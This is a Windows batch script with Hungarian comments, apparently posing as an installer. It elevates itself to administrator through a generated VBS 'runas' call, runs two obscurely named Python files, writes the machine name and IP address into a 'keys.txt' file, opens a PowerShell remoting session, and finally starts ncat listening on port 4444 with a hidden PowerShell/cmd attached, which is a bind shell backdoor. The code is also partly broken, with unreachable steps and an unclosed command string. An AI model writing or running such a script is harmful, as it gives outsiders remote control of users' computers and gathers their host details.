@echo off
setlocal enabledelayedexpansion

REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
    goto admin_folytatas
) ELSE (
    echo Rendszergazdai jogosultsagok kerese...
    goto ker_admin
)

:ker_admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //B "%temp%\getadmin.vbs"
    exit

:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: hozzon létre egy keys.txt filet, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt")

python "%TARGET%\spwww743g7w.py"
python "%TARGET%\fwsendbfgw.py"

:: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
set "GEPNEV=%COMPUTERNAME%"

:: IPv4 cim
for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"

---

:: Mentés keys.txt-be
(
    echo GEPNEV: !GEPNEV!
    echo IP: !IP!
) > "%TARGET%\keys.txt"

echo [INFO] A keys.txt elkeszult a %TARGET% mappaban.
echo [INFO] PowerShell Remoting elinditasa a %IP% cimen...
echo.

:: POWERHSHELL REMOTING BLOKK
powershell.exe -Command "
    $user = Get-Credential;
    Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
    Enter-PSSession -ComputerName %IP% -Credential $user

:: A parancs futtatása után a .bat script folytatódik (vagy bezárul)

echo.
echo [INFO] A munkamenet befejezodott vagy megszakadt.

"%NCAT%" -l -p 4444 -e "powershell.exe -w hidden C:\Windows\System32\cmd.exe"

echo.
pause
